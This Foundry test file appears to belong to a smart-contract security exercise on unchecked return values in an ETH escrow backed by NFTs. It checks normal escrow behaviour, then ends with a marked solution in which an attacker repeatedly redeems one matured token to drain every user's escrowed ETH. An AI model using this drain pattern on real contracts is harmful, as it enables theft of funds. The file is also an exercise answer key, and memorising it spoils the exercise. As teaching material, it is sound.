// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {EscrowNFT} from "../../src/unchecked-returns-2/EscrowNFT.sol";
import {Escrow} from "../../src/unchecked-returns-2/Escrow.sol";
import "@openzeppelin/contracts/utils/Strings.sol";


/**
 * Unchecked Returns Exercise 2
 * All the tests should pass if you run
 * 
 * @dev run "forge test --match-path test/unchecked-returns-2/TestUR2.t.sol -vvv"
 */
contract TestUR2 is Test {

    address private deployer;
    address private userOne;
    address private userTwo;
    address private userThree;
    address private attacker;

    EscrowNFT escrowNft;
    Escrow escrow;

    uint256 private constant ONE_MONTH = 30 * 24 * 60 * 60;

    uint256 private constant TWO_ETH = 2 ether; // 2 ETH
    uint256 private constant USER1_ESCROW_AMOUNT = 10 ether; // 10 ETH
    uint256 private constant USER2_ESCROW_AMOUNT = 54 ether; // 54 ETH
    uint256 private constant USER3_ESCROW_AMOUNT = 72 ether; // 72 ETH

    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
    function setUp() public {
        // create the accounts
        deployer = makeAddr("deployer");
        userOne = makeAddr("userOne");
        userTwo = makeAddr("userTwo");
        userThree = makeAddr("userThree");
        attacker = makeAddr("attacker");

        // Set attacker balance to 2 ETH
        vm.deal(attacker, TWO_ETH);
        vm.deal(userOne, USER1_ESCROW_AMOUNT);
        vm.deal(userTwo, USER2_ESCROW_AMOUNT);
        vm.deal(userThree, USER3_ESCROW_AMOUNT);

        vm.startPrank(deployer);

        // Deploy NFT
        escrowNft = new EscrowNFT();
        // Deploy Escrow
        escrow = new Escrow(address(escrowNft));
        // Transfer ownership of NFT contrct to Escrow contract
        escrowNft.transferOwnership(address(escrow));
        vm.stopPrank();
    }

    function testEscrowNFTWorks() public {
        // Escrow 10 ETH from user1 to user2, one month treshold
        vm.prank(userOne);
        escrow.escrowEth{value: USER1_ESCROW_AMOUNT}(userTwo, ONE_MONTH);

        uint tokenId = escrowNft.tokenCounter();
        // User2 can't withdraw before matureTime
        vm.startPrank(userTwo);
        escrowNft.approve(address(escrow), tokenId);
        vm.expectRevert(bytes("Escrow period not expired."));
        escrow.redeemEthFromEscrow(tokenId);
        vm.stopPrank();

        // Fast forward to mature time
        skip(ONE_MONTH);

        // Another user can't withdraw if he doesn't own this NFT
        vm.prank(userThree);
        vm.expectRevert(bytes("Must own token to claim underlying ETH"));
        escrow.redeemEthFromEscrow(tokenId);

        // Recipient can withdraw after matureTime
        vm.startPrank(userTwo);
        escrowNft.approve(address(escrow), tokenId);
        uint256 balanceBefore = userTwo.balance;
        escrow.redeemEthFromEscrow(tokenId);
        uint256 balanceAfter = userTwo.balance;
        assertGt(balanceAfter, balanceBefore);
        vm.stopPrank();


        // Some users escrow more ETH
        vm.deal(userOne, USER1_ESCROW_AMOUNT);
        
        vm.prank(userOne);
        escrow.escrowEth{value: USER1_ESCROW_AMOUNT}(userTwo, ONE_MONTH);
        vm.prank(userTwo);
        escrow.escrowEth{value: USER2_ESCROW_AMOUNT}(userOne, ONE_MONTH);
        vm.prank(userThree);
        escrow.escrowEth{value: USER3_ESCROW_AMOUNT}(userOne, ONE_MONTH);

        // SOLUTION - attack
        vm.startPrank(attacker);
        escrow.escrowEth{value: TWO_ETH}(attacker, 0);
        uint256 lastTokenId = escrowNft.tokenCounter();

        // Make sure the tokenId exists 
        uint256 balanceToSteal = address(escrow).balance; 
        uint256 iterations = balanceToSteal / TWO_ETH;
        for (uint256 i = 1; i <= iterations; i++) {
            escrow.redeemEthFromEscrow(lastTokenId);
        }
        assertEq(address(escrow).balance, 0);
        assertEq(attacker.balance, balanceToSteal);
        vm.stopPrank();
    }

}